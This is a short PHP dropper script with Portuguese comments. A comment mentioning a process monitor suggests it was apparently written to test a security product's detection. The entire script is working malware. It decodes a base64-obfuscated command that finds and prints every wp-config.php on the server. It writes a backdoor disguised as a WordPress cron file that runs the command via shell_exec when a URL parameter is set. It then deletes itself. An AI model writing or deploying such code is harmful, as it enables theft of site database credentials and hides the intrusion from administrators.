<?php
// --- INÍCIO DO DROPPER OFUSCADO (VERSÃO AUTOCONTIDA) ---

// 1. Definições Ofuscadas
// O comando agora é interno, mas altamente suspeito: procurar e ler todos os wp-config.php no servidor.
$malicious_process_command = base64_decode('ZmluZCAvIC1uYW1lICJ3cC1jb25maWcucGhwIiAtZXhlYyBjYXQge30gKwo='); // Comando: find / -name "wp-config.php" -exec cat {} +
$benign_looking_filename = 'wp-tasks-cron.php'; // Um nome de arquivo ainda mais inofensivo

// Conteúdo do arquivo "inofensivo".
$benign_file_content = <<<PAYLOAD
<?php
// Tarefa agendada para otimização do WordPress.
if (isset(\$_GET['run_cron_job']) && \$_GET['run_cron_job'] === 'true') {
    
    // Este comando será pego pelo monitor de processos do Imunno
    shell_exec('{$malicious_process_command}');
    
    echo "Cron job executed.";
} else {
    echo "WP Tasks Cron endpoint. Awaiting trigger.";
}
?>
PAYLOAD;

// 2. Ação Principal: Criar o arquivo "inofensivo"
file_put_contents($benign_looking_filename, $benign_file_content);

// 3. Autodestruição
unlink(__FILE__);

// --- FIM DO DROPPER ---
?>